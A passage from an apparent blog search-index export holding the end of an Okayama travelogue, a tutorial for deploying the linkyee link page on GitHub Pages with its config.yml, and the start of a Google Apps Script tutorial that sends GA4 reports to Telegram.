available).09:30 McDonald‚Äôs at Okayama Station to try the ‚ÄúWaffle Burger‚Äù that has been very popular in Taiwan recentlyI almost chose the wrong item because I couldn‚Äôt read Japanese. You need to pick this one, ‚Äú„Éû„ÉÉ„ÇØ„Ç∞„É™„Éâ„É´,‚Äù to get the pancake series. McDonald‚Äôs breakfast hours in Japan are until 10:30.After eating, around 10:00, there was no specific place I wanted to visit.Last time, I already visited Okayama Castle and Kibitsu Shrine. With the remaining time, I went to explore Okayama AEON Mall.Okayama Art SeasonThis year, Okayama is hosting the Art Festival.Okayama Station under construction and Momotaro temporarily moved beside the station.Cross the road from the underground mall to AEON MALL B2, where there is also a McDonald‚Äôs.This place is very spacious and great for shopping, with almost all brands available.There are places to eat and buy souvenirs (B1-B2) as well.Keep looking for capsule toys, but I couldn‚Äôt find the train button capsule toy I wanted, so I gave up‚Ä¶ It‚Äôs probably no longer available.Some stores also sell Jiikawa.~=11:00 Getting ready for lunch Not very hungry, but to prepare for the afternoon wait at the airport and since Tigerair doesn‚Äôt provide meals, I still have to eat. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èThere are many food options upstairs.Pork Steak Specialty Shop B Okayama BranchChose a restaurant specializing in teppan pork chops.Ordered a 200g pork steak set meal and a draft beer. The total was 2,178 yen.Surprisingly, the pork cutlet was served medium rare, about 70% cooked; after checking reviews and descriptions, it seems this is their specialty. However, I still used the hot iron plate to cook the pieces that could be cooked further. It really tastes delicious, very juicy, full of meaty aroma, and not tough to chew; personally, I think it‚Äôs as good as yesterday‚Äôs Kobe beef (I might just not be lucky with wealth).Small useless suitcase (about the same size as AirPods Pro) and kid‚Äôs bagFinally, I bought some items at MUJI on the first floor and left around 12:15.~=12:30 Return to Okayama StationPreparing to take the 1:00 PM shuttle to Gangshan Airport.One last look at Okayama.~=13:00 Take the shuttle bus to Gangshan AirportAt Platform 21, queue up to wait for the bus. Don‚Äôt worry about missing the ride; anyone who queues before 13:00 will be taken to the airport (additional shuttle buses will be added if full).You can directly tap your transportation card (Suica) when boarding and alighting, or you can buy a ticket by inserting coins inside the bus shelter.The bus departed early at 12:45 due to full capacity.~=13:20 Arrive at Okayama Momotaro AirportThe time is still very early. This year, I took the 17:30 flight, while last year I took the 15:25 flight, which was just right. Now, for the 17:30 flight, I have to wait almost 4 hours.https://www.okayama-airport.org/tw/access/bus But currently it‚Äôs not possible because the next bus is at 15:55, arriving at the airport at 16:25; although the airport is small and there is only one outbound flight at the same time, which is quite fast, traffic jams and other factors make it hard to guarantee arrival by 16:25. For example, when I came, I encountered traffic jams that added almost 30 minutes to the trip. It depends on whether Okayama Airport increases shuttle bus services, or you can go to the Japan Free Travel Discussion Group to find people to share a taxi. Others shared that a taxi from Okayama Station to the airport costs about 7,000 yen.Wandering around near the airport, there is a miniature version of Okayama Korakuen Garden outside the airport, along with popular maple leaves.Outside the station, there is also a statue of Momotaro. Additionally, the airport kindly reminds you to buy insurance. This time, I really almost got hit by a bicycle. ‚ö†Ô∏èThere are quite a few seats available here for resting.The first floor only has a souvenir shop, nothing else. Just like last year, I bought a peach mochi to eat.The second floor is under renovation, with only a few shops open. The observation deck that was accessible last year (link) also seems to be closed. However, there is still a souvenir shop and several food outlets available.~=15:00 Begin check-in proceduresMomotaro Airport is too small, so the check-in and baggage drop-off process is different from other airports. This is the unified queue. Checked luggage goes through X-ray and receives a sealing sticker; carry-on luggage does not (security checks before departure will scan other items). Even without checked luggage, you must join the queue. When it‚Äôs your turn, inform the airport staff that you have no checked luggage and proceed directly. If you open your suitcase after the sticker is applied, it must be rescanned and restickered. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è The airport staff can speak Chinese‚Ä¶ very impressive~=15:15 Check-in and baggage drop completedThis time, I didn‚Äôt buy much or any alcohol, yet it still weighed 17 kg‚Ä¶ but I barely had any carry-on luggage; everything was packed inside.~=16:20 Start security check and immigration clearance queueThe airport is under renovation‚Ä¶ but there are still capsule toys available.Although there was only one flight, because the airport is small, has few staff, only one line, and thorough checks, the security screening and departure process took about 20‚Äì30 minutes.The place for pouring water and discarding items is just a box. It feels like if you rush to leave Okayama at 15:55 and catch the shuttle to the airport at 16:25, as long as you arrive on time, the check-in and baggage drop counters should be empty and you can handle them directly. Then you can go straight to the departure security check and still make it in time. We are the only flight on this route, so the plane will likely depart only after all checked-in passengers complete security. Arriving early at the airport doesn‚Äôt mean you‚Äôll get through security faster if you queue late.~=16:42 Start waiting for the flightThe waiting lounge is small, with only one duty-free shop selling a limited selection of souvenirs, tobacco, and alcohol.I wanted to buy a few cans of peach water to bring back to Taiwan, but they were all sold out; so I bought a can of K≈çcha Kaden instead. After trying it, I found it very tasty and not too sweet. I regret not buying more.~=18:10 Departure (40 minutes delay) Goodbye Okayama, goodbye Japan.Sitting next to me on the plane was a Youtuber, a friendly guy from Follow us and Chill with us. He was going to Shikoku this time, and we exchanged some sightseeing recommendations. I hope to visit Shikoku someday too.19:45 Arrive in Taiwan (10-minute delay)Luckily, it only affected 10 minutes. Quickly picked up the luggage and rushed to the bus station.20:20 Take the Daya Bus to TaipeiDepending on the location, you can take different buses home. Previously, I took the Kuokuang bus directly to Taipei. This time, I will take the Dayou Bus from platform 11 back to New Taipei. Coincidentally, the EasyCard balance was insufficient, so I hurried to the counter to buy a ticket with cash (luckily, I had brought New Taiwan dollars the day before), and finally caught the bus.End of the journey.Summary of ThoughtsThis trip was too packed, and we only had a brief look at many places. Especially during the first three days, due to long travel distances and short stays, we couldn‚Äôt fully enjoy the beautiful scenery of Izumo and Matsue in Shimane. If given the chance, I would like to visit again to watch the sunset, see the autumn leaves, and experience the Kamiari Festival.If you want to learn about history before visiting Izumo, you can refer to Papa Lan‚Äôs videos: How was this land of Japan born? It was actually born!! | Japanese Mythology | Birth of Japan | Creation of Heaven and Earth | Kuniumi | Kamiumi | Ooyashima-kuni | Izanagi | Izanami | Papa Lan Storytelling Japan‚Äôs naughtiest god, who fathered the direct ancestor of the Japanese imperial family with his own sister! He slayed the Yamata no Orochi, married a beautiful wife, and is known as the ‚ÄúGod of Winning in the Divine World‚Äù! Japan‚Äôs first waka poem actually came from him?! | Japanese Mythology | Susanoo | Amano-Iwato | Yamata no Orochi | Inadahime | Papa Lan Storytelling Why did a rabbit provoke a group of sharks? After two near-death experiences, he married the daughter of his ancestor! Okuninushi Myth | Okuninushi | White Rabbit of Inaba | Ne-no-kuni | Japanese Mythology | Papa Lan StorytellingThese introduce the stories of Amaterasu, Okuninushi (Izumo Shrine), and the White Rabbit of Inaba.Sanyo Okayama Hiroshima Area Travelogue [Travelogue] 2023 Sanyo Region Hiroshima Okayama 6-Day Independent TripYou can also refer to travelogues of the Sanyo region. If you have time, you can visit both Sanyo and Sanin together.KKday Promotion üõí Japan JR PASS | Tottori &amp; Matsue Area Pass | eMCO e-ticket(Consider this if you only visit Matsue and the Tottori Matsue area) Kansai &amp; Sanin Area Rail Pass JRPass(Best choice for arrivals and departures via Okayama Airport) Japan eSIM CardÔΩúDaily High-Speed, Total Data, Unlimited Data Plans Japan JR PASSÔΩúSanyo &amp; Sanin Area Rail PassÔΩúeMCO E-Ticket(Explore the entire Sanyo and Sanin regions in one trip) Tottori Sand Dunes | Japan‚Äôs Only Thrilling Sandboarding Experience „ÄêTottori Bus One-Day Tour„ÄëTottori Sand Dunes, Uratomi Coast Cruise, Sand Museum, Pear Picking ExperienceÔΩúIncludes Special Lunch (Departing from Osaka) Tottori Sand Dunes and Famous Izumo Taisha 2-Day Bus Tour (From Osaka) New Year Visit! 3-Hour Stop at Izumo Taisha Shrine [From Hiroshima] If this article is helpful to you, please consider using my referral link to purchase KKday products and tours. I will receive a commission to support more travel content creation. Thank you.If you have any questions or feedback, feel free to contact me.More Travelogues Tokyo Area Travel GuideÔΩúKawagoe Little Edo &amp; Atami Fireworks Festival 5-Day Itinerary Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration San‚Äôin &amp; Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours Sanyo Region Travel GuideÔΩú6-Day Hiroshima &amp; Okayama Itinerary for Freedom Seekers Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki &amp; Kumamoto Efficiently Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay &amp; Transport Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay &amp; Transit TipsFound this guide useful? Use my KKday referral link to book your trip‚ÄîI‚Äôll earn a small commission to support more content like this. Thank you! üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "GitHub PagesÔΩúCreate Free Custom LinkTree-Style Personal Link Pages Fast", "url": "/posts/zrealm-robotic-process-automation/github-pages-create-free-custom-linktree-style-personal-link-pages-fast-70aeddb1fd9b/", "categories": "ZRealm Robotic Process Automation", "tags": "english, ai-translation, linktree, github-pages, automation, ruby, jekyll", "date": "2024-10-27 13:36:34 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!linkyee ‚Äî Quickly Create a Personal LinkTree-Style Page for Free Using GitHub ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!linkyee ‚Äî Quickly Create a Personal LinkTree-Style Page for Free Using GitHub PagesCreate Your Own Link Page Quickly with GitHub Pages: 100% Free, Customizable, and Supports Custom DomainsResultshttps://link.zhgchg.li I have open-sourced the project and packaged it as a Template Repo (linkyee). Friends who need it can directly Fork to quickly deploy and use.linkyee ‚Äî Your Own Link PagesAdvantages: Direct Deployment on Github Pages: Stable and Free Master the HTML source file to freely modify layout, styles, remove ads, and copyright notices; (the default style is created by me using GenAI ChatGPT) Support Custom Domain Names Supports dynamic variables, such as preset Medium followers and GitHub repo star count variables, which can automatically update and display follower numbers on the page. üöÄüöÄüöÄ Fast Page Loading Follow these simple steps to complete the setup and deployment. Github PagesGithub Pages is a free static site hosting service provided by Github. All Github Free accounts can use it directly for Public Repos. For Private Repos, you need to upgrade your Github account with a paid plan.Limitations Only static file resources can be hosted: HTML, CSS, JavaScript, font files, image files, PDFs, audio files, text files, etc. The website (Repo) size must not exceed: 1 GB. This seems to be a soft limit, as my Github Pages Jekyll Repo is already nearly 5 GB. Longest Deployment Time: 10 minutes Maximum deployments per hour: 10 times (soft limit) Monthly Data Limit: 100 GB (soft limit) Too many requests may result in an HTTP 429 response. Other Github Pages Application Articles I deployed my Jekyll Blog using Github Pages ‚û°Ô∏è ZhgChgLi Painless Migration from Medium to Github Pages Github Pages Custom Domain Tutorial Getting Started ‚Äî Deploy on GitHub PagesStep 1. Click the ‚ÄúUse this template‚Äù button at the top right of the linkyee template library -&gt; ‚ÄúCreate a new repository‚Äù:Step 2. Check ‚ÄúInclude all branches,‚Äù enter your desired GitHub Pages repository name, then click ‚ÄúCreate repository‚Äù: The GitHub Pages repo name will be the access URL. If you name the repo your-username.github.io, this will become the direct access URL for your GitHub Pages site. If you already have a your-username.github.io repo, the GitHub Pages URL will be your-username.github.io/Repo-Name.Waiting for the Fork to complete. Deployment errors may occur initially due to permission issues with the Forked repository. Next, we will make adjustments step by step.Step 4. Go to Settings -&gt; Actions -&gt; General, and make sure to select the following options: Actions permissions: Allow all actions and reusable workflows Workflow permissions: Read and write permissions After making your selection, click the Save button to save the changes.Step 5. Go to Settings -&gt; Pages, and confirm the GitHub Pages branch is set to ‚Äúgh-pages‚Äù: The message ‚ÄúYour site is live at: XXXX‚Äù is your GitHub Pages public access URL.Step 6. Go to Settings -&gt; Actions, and wait for the first deployment to complete:Step 7. Visit the GitHub Pages URL to confirm if the Fork was successful: Congratulations! Deployment successful. You can now edit the configuration file and replace it with your data. üéâüéâüéâSettingsSetting up the fileEdit the config.yml file located in the root directory.# Website Configuration # Theme name, corresponds to directory: ./theme/xxxx theme: default # HTML language setting lang: \"en\" # Plugins (implemented in ./plugins/PLUGIN_NAME) # Use {{ vars.PLUGIN_NAME }} in the settings below # Plugin output can be used below, e.g.: {{vars.MediumFollowersCountPlugin}} plugins: # Automatically fetch Medium followers count - MediumFollowersCountPlugin: username: zhgchgli # Automatically fetch GitHub repo stars count - GithubRepoStarsCountPlugin: - ZhgChgLi/ZMarkupParser - ZhgChgLi/ZReviewTender - ZhgChgLi/ZMediumToMarkdown - ZhgChgLi/linkyee # Google Analytics tracking ID google_analytics_id: # HTML title title: \"ZhgChgLi's Link Collection\" # Avatar image path avatar: \"./images/profile.jpeg\" # Name block text name: \"@zhgchgli\" # Tagline block text tagline: &gt;- An iOS, web, and automation developer from Taiwan who loves sharing, traveling, and writing. # Links list # icon: use Font Awesome icons (https://fontawesome.com/search?o=r&amp;m=free) # text: text displayed on the link # title: link title # url: link URL # alt: alternative text (for accessibility) # target: `_blank` opens in new tab, `_self` opens in same page links: - link: icon: \"fa-brands fa-medium\" text: \"Tech Blog &lt;span class='link-button-text'&gt;({{vars.MediumFollowersCountPlugin}} Followers)&lt;/span&gt;\" url: \"https://blog.zhgchg.li\" alt: \"ZhgChgLi's Tech Blog\" title: \"ZhgChgLi's Tech Blog\" target: \"_blank\" - link: icon: \"fa-brands fa-medium\" text: \"Travel Journal &lt;span class='link-button-text'&gt;({{vars.MediumFollowersCountPlugin}} Followers)&lt;/span&gt;\" url: \"https://medium.com/ztravel\" alt: \"ZhgChgLi's Travel Journal\" title: \"ZhgChgLi's Travel Journal\" target: \"_blank\" - link: icon: \"fa-solid fa-rss\" text: \"Personal Website\" url: \"https://zhgchg.li/\" alt: \"ZhgChgLi's Website\" title: \"ZhgChgLi's Website\" target: \"_blank\" - link: icon: \"fa-brands fa-swift\" text: \"ZMarkupParser &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZMarkupParser']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZMarkupParser\" alt: \"ZMarkupParser is a pure Swift library to convert HTML strings into NSAttributedString with custom styles.\" title: \"ZMarkupParser is a pure Swift library to convert HTML strings into NSAttributedString with custom styles.\" target: \"_blank\" - link: icon: \"fa-brands fa-app-store-ios\" text: \"ZReviewTender &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZReviewTender']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZReviewTender\" alt: \"ZReviewTender is a tool to fetch app reviews from App Store and Google Play Console and integrate them into workflows.\" title: \"ZReviewTender is a tool to fetch app reviews from App Store and Google Play Console and integrate them into workflows.\" target: \"_blank\" - link: icon: \"fa-brands fa-markdown\" text: \"ZMediumToMarkdown &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZMediumToMarkdown']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZMediumToMarkdown\" alt: \"ZMediumToMarkdown is a powerful tool to easily download and convert Medium articles into Markdown format.\" title: \"ZMediumToMarkdown is a powerful tool to easily download and convert Medium articles into Markdown format.\" target: \"_blank\" - link: icon: \"fa-brands fa-github\" text: \"linkyee &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/linkyee']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/linkyee\" alt: \"linkyee is a fully customizable and open-source LinkTree alternative deployable directly on GitHub Pages.\" title: \"linkyee is a fully customizable and open-source LinkTree alternative deployable directly on GitHub Pages.\" target: \"_blank\" # Social media links list # icon: use Font Awesome icons (https://fontawesome.com/search?o=r&amp;m=free) # title: link title # url: social media URL # alt: alternative text (for accessibility) # target: `_blank` opens in new tab, `_self` opens in same page socials: - social: icon: \"fa-brands fa-medium\" url: \"https://blog.zhgchg.li\" title: \"ZhgChgLi's Medium\" alt: \"ZhgChgLi's Medium\" target: \"_blank\" - social: icon: \"fa-brands fa-github\" url: \"https://github.com/ZhgChgLi\" title: \"ZhgChgLi's GitHub\" alt: \"ZhgChgLi's GitHub\" target: \"_blank\" - social: icon: \"fa-brands fa-twitter\" url: \"https://twitter.com/zhgchgli\" title: \"ZhgChgLi's Twitter\" alt: \"ZhgChgLi's Twitter\" target: \"_blank\" - social: icon: \"fa-brands fa-linkedin\" url: \"https://www.linkedin.com/in/zhgchgli/\" title: \"ZhgChgLi's LinkedIn\" alt: \"ZhgChgLi's LinkedIn\" target: \"_blank\" - social: icon: \"fa-brands fa-instagram\" url: \"https://www.instagram.com/zhgchgli/\" title: \"Instagram\" alt: \"ZhgChgLi's Instagram\" target: \"_blank\" - social: icon: \"fa-solid fa-envelope\" url: \"zhgchgli@gmail.com\" title: \"Email: zhgchgli@gmail.com\" alt: \"zhgchgli@gmail.com\" target: \"_blank\" # Footer text footer: &gt; Welcome to my website! Follow me on Medium or GitHub for the latest updates, or stay connected on Instagram and LinkedIn. # Footer copyright statement # Linkyee is a 100% free open-source project‚Äîyou can freely modify the copyright statement. :) copyright: &gt; ¬© 2024 &lt;a href=\"https://zhgchg.li\" target=\"_blank\"&gt;ZhgChgLi&lt;/a&gt;. Powered by &lt;a href=\"https://github.com/ZhgChgLi/linkyee\" target=\"_blank\"&gt;linkyee&lt;/a&gt;. Please note, after each file modification, you need to wait for GitHub Actions to complete the automated build, page build, and deployment tasks. Refresh the page to apply the changes. üöÄSuccess!!Customize Style, Modify Default Theme ./themes/default/index.html ./themes/default/styles.css ./themes/default/scripts.js Create New Topic ./themes/ YOUR_THEME Update in the config.yml file to theme:YOUR_THEME That‚Äôs right, you can use GenAI tools like ChatGPT to help you create custom link pages! (The default style was also generated by ChatGPT)Automatic RedeploymentBy default, the project redeploys automatically once a day to refresh the dynamic variable values of the plugin. You can adjust the cron settings in Github Action ‚Äî Automatic build ( .github/workflows/build.yml):schedule: - cron: '0 0 * * *' # Run daily at midnight 00:00 (UTC)If you don‚Äôt need to redeploy on a schedule, you can remove the schedule block directly.Custom Domain ‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏èYou can set up a custom GitHub Pages domain, for example mine: https://link.zhgchg.li .You can refer to my previous article ‚ÄúGithub Pages Custom Domain Tutorial‚Äù for a step-by-step guide from purchasing to binding a domain. You can also buy a domain through my Namecheap referral link ‚Äî I will receive a commission, which helps me continue contributing to open source projects.Buy me a coffee ‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏èhttps://www.paypal.com/ncp/payment/CMALMPT8UUTY2If this project helps you, please consider Starring the Repo or recommending it to friends, or buying me a coffee. Thank you for your support!Feel free to submit an Issue or contribute fixes via Pull Request. :)If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "GA4 Data Alerts AutomationÔΩú3-Step Guide to Build Free Telegram Bot Notifications", "url": "/posts/zrealm-robotic-process-automation/ga4-data-alerts-automation-3-step-guide-to-build-free-telegram-bot-notifications-1e85b8df2348/", "categories": "ZRealm Robotic Process Automation", "tags": "english, ai-translation, automation, google-apps-script, telegram, google-analytics, rpa-solutions", "date": "2024-10-20 16:19:52 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Simple 3 Steps ‚Äî Create a Free GA4 Automatic Data Notification BotUsing Google...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Simple 3 Steps ‚Äî Create a Free GA4 Automatic Data Notification BotUsing Google Apps Script to Complete RPA, Integrating GA4 + Telegram Bot Data Notification RobotPhoto by BoliviaInteligenteIntroductionSince around 2020, I have been exploring RPA using available tools. Initially, it was just to automate personal routine tasks. Later, at work, I joined larger organizations where I often encountered cross-team or person-dependent tasks, as well as repetitive tasks, which revealed the true benefits of RPA automation.For example: a repetitive task occurs 10 times a month, each taking 30 minutes to complete, involving 60 people. The team spends 3,600 hours per year on this. If 100 hours are invested to develop automation, the time saved can be used for more valuable work; effectively turning 3,600 wasted hours into 3,600 hours of more worthwhile output.For more details, please refer to my previous article: 2021 Pinkoi Tech Career Talk ‚Äî Secrets of a High-Efficiency Engineering Team Automate Daily Data Reports with Google Apps Script RPA Other RPA projects completed: [GMail to Slack] Forward Gmail Emails to Slack Using Google Apps Script [Google Form x Google Sheet x Slack] Slack Creates a Fully Automated WFH Employee Health Status Reporting System [Big Query x Slack] Crashlytics + Big Query Build a More Real-Time and Convenient Crash Tracking Tool [Google Analytics x Slack] Crashlytics + Google Analytics Automated Query for App Crash-Free Users Rate [Github Webhook x Line Notify] Create a Github Repo Star Notifier for Free in Three Steps Using Google Apps Script [Slack x OpenAI (ChatGPT)] Slack &amp; ChatGPT Integration [Google Analytics x Google Sheet] Automate Daily Data Reports with Google Apps Script RPA [iOS Shortcut x Line x Reminders] iOS Shortcut Automation Use Case ‚Äî Auto Forwarding SMS and Auto Creating Reminder Tasks [Apple Store API x Google Play Console API x Github Action] Github Action x ZReviewTender Free Quick Deployment of Your App Store Review Monitoring Bot [Telegram Bot] Quickly Migrate Line Notify to Telegram Bot Notifications in 10 Minutes [Medium to Jekyllrb] Seamless Migration from Medium to Self-Hosted Website From backend data, many articles have been indexed by ChatGPT and various GenAI services, indirectly helping many non-engineers who want to try using RPA to solve problems. Therefore, I will continue to share RPA scenarios from my life and work, along with my solutions ‚Äî ZRealm Robotic Process Automation.Commercial TimeIf you and your team need automation tools or process integration, whether it‚Äôs Slack App development, Notion, Asana, Google Sheets, Google Forms, GA data, or any other integration needs, feel free to contact me for development.This Article: Google Analytics 4 x Telegram BotThe integration scenario introduced this time follows the previous article ‚Äú10-Minute Quick Migration from Line Notify to Telegram Bot Notifications‚Äù. I realized that my Medium backup site ‚Äúzhgchg.li‚Äù has never had its GA4 website data monitored. I thought it would be good to create another notification bot to send the past 7 days of website data daily to a specified Telegram Channel to keep me informed.This article is just a brief piece. For a complete automated data report, please refer to the previous article ‚ÄúUsing Google Apps Script to Implement Daily Data Report RPA Automation‚Äù. Also, a previous integration with GA4 to fetch the App Crash-free rate can be found in the article ‚ÄúCrashlytics + Google Analytics Automated Query for App Crash-Free Users Rate‚Äù. This article will not cover the free limits, detailed usage, deployment, or features of Google Apps Script. Please refer to the previous article. Creating and using a Telegram Bot will not be further explained here. Please refer to the previous article. ResultsHere is the final result: Google Apps Script automatically fetches my desired Google Analytics 4 website data between 12 PM and 1 PM daily, then compiles the information and sends it to my Telegram Channel via a Telegram Bot. This allows me to quickly review the website data from the past 7 days.The data I want to observe is: Total page views screenPageViews from the past 7 days 7daysAgo ~ today Active Users active7DayUsers New Users newUsers Top 10 page views screenPageViews / pageTitle New user initial source medium newUsers / firstUserSourceMedium You can actually use GA Dev Tools to generate and adjust according to your own needs.Step 1. Use the GA4 Query Explorer official tool to generate data report query parametersFirst, we need to use the official tool GA4 Query Explorer to generate the query parameters for the data report we need: Select Property: Note down your property IDThe property ID will be used later when writing Google Apps Script. start date, end date: The date range for the report start to end. You can use YYYY-MM-DD or the magic variables yesterday, today, NdaysAgo. metrics: Select the metrics you want to query dimensions: Choose the dimension you want to query metric aggregations: Data aggregation calculation rules Here is an example based on my scenario: Property ID: 318495208 start_date: 7daysAgo end_date: yesterdaySince GA data reports are delayed, querying from yesterday to seven days ago is the most accurate. metric aggregations: total Other filters and limits can be set according to your needs:filter I don‚Äôt need, leave blank; limit I enter 10 because I only want to know the Top 10.Click ‚ÄúMAKE REQUEST‚Äù to generate the corresponding data report query parameters and results:Note the following request parameters, which will be used later for writing Google Apps Script:{ \"dimensions\": [ { \"name\": \"pageTitle\" } ], \"metrics\": [ { \"name\": \"screenPageViews\" } ], \"dateRanges\": [ { \"startDate\": \"7daysAgo\", \"endDate\": \"yesterday\" } ], \"limit\": \"10\", \"metricAggregations\": [ \"TOTAL\" ]}Result: Comparison with data on GA is accurate and consistent ‚úÖ‚úÖ‚úÖStep 2. Create Google Apps Script &amp; Use Google Analytics Data API to Query Data Go to https://script.google.com/home Create a new project and name the project. Click ‚ÄúServices‚Äù -&gt; ‚Äú+‚Äù to add a new service Select ‚ÄúGoogle Analytics Data API‚Äù Click ‚ÄúAdd‚Äù Paste Google Analytics Data API Query Code and Combine:Query data parameters generated from the previous steps:{ \"dimensions\": [ { \"name\": \"pageTitle\" } ], \"metrics\": [ { \"name\": \"screenPageViews\" } ], \"dateRanges\": [ { \"startDate\": \"7daysAgo\", \"endDate\": \"yesterday\" } ], \"limit\": \"10\", \"metricAggregations\": [ \"TOTAL\" ]}Convert to Code:function execute() { Logger.log(JSON.stringify(fetchScreenPageViews(\"318495208\")));}// Split into a separate function for easier reuse later...// Default startDate=7daysAgo, endDate=yesterday// Other usages:// e.g. fetchScreenPageViews(\"1111\", \"3daysAgo\", \"yesterday\")// e.g. fetchScreenPageViews(\"2222\", \"yesterday\", \"today\")function fetchScreenPageViews(propertyId, startDate = \"7daysAgo\", endDate = \"yesterday\") { const screenPageViewsMetric = AnalyticsData.newMetric(); screenPageViewsMetric.name = \"screenPageViews\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const pageTitleDimension = AnalyticsData.newDimension(); pageTitleDimension.name = \"pageTitle\"; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [pageTitleDimension]; request.metrics = [screenPageViewsMetric]; request.dateRanges = dateRange; request.limit = 10; request.metricAggregations = \"TOTAL\"; return AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId);}Code Analysis:// Metrics can be multiple, declare separately...const screenPageViewsMetric = AnalyticsData.newMetric();screenPageViewsMetric.name = \"screenPageViews\";// For example, another metric active1DayUsers:const active1DayUsersMetric = AnalyticsData.newMetric();active1DayUsersMetric.name = \"active1DayUsers\";// Declare date rangeconst dateRange = AnalyticsData.newDateRange();dateRange.startDate = startDate;dateRange.endDate = endDate;// Dimensions can be multiple, declare separately...const pageTitleDimension = AnalyticsData.newDimension();pageTitleDimension.name = \"pageTitle\";// For example, another dimension:const firstUserSourceMediumDimension = AnalyticsData.newDimension();firstUserSourceMediumDimension.name = \"firstUserSourceMedium\";//// Create Request objectconst request = AnalyticsData.newRunReportRequest();request.metrics = [active1DayUsersMetric, active1DayUsersMetric]; // Include all metrics...request.dimensions = [pageTitleDimension, firstUserSourceMediumDimension]; // Include all dimensions...request.dateRanges = dateRange;// Only need top 10 data entriesrequest.limit = 10;// Set data aggregation logic: Total (SUM)request.metricAggregations = \"TOTAL\";// Generate query resultreturn AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId).rows;The first time you run it, authorization is required (if new permissions are added to the code later, reauthorization will be needed): In fact, this authorizes Google Apps Script to use your account identity to run these scripts in the future, so you need to ensure the account you choose has access rights to the corresponding GA reports. After writing the code, click ‚ÄúDebug‚Äù -&gt; click ‚ÄúReview Permissions‚Äù Select the identity account to execute, usually the same as the current Google Apps Script account Select ‚ÄúAdvanced‚Äù to expand -&gt; Click ‚ÄúGo to XXX‚ÄùThis is an app we developed for our own use and does not require Google verification. Click ‚ÄúAllow‚ÄùAllow then click ‚ÄúDebug‚Äù or ‚ÄúRun‚Äù to execute the program:Here, we first use Logger.log(JSON.stringify()) to get the output result:{ \"kind\": \"analyticsData#runReport\", \"dimensionHeaders\": [ { \"name\": \"pageTitle\" } ], \"rowCount\": 71, \"metadata\": { \"currencyCode\": \"TWD\", \"timeZone\": \"Asia/Taipei\" }, \"rows\": [ { \"dimensionValues\": [ { \"value\": \"ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"166\" } ] }, { \"metricValues\": [ { \"value\": \"109\" } ], \"dimensionValues\": [ { \"value\": \"Apple Watch Official Stainless Steel Milanese Band Unboxing \\| ZhgChgLi\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS ‚â• 13.1 Using the ‚ÄúShortcuts‚Äù Automation Feature with Mijia Smart Home \\| ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"101\" } ] }, { \"dimensionValues\": [ { \"value\": \"Medium Partner Program Finally Open to Global (Including Taiwan) Writers! \\| ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"85\" } ] }, { \"metricValues\": [ { \"value\": \"77\" } ], \"dimensionValues\": [ { \"value\": \"iOS Shortcuts Automation Use Cases ‚Äî Auto Forward SMS and Auto Create Reminder To-Dos \\| 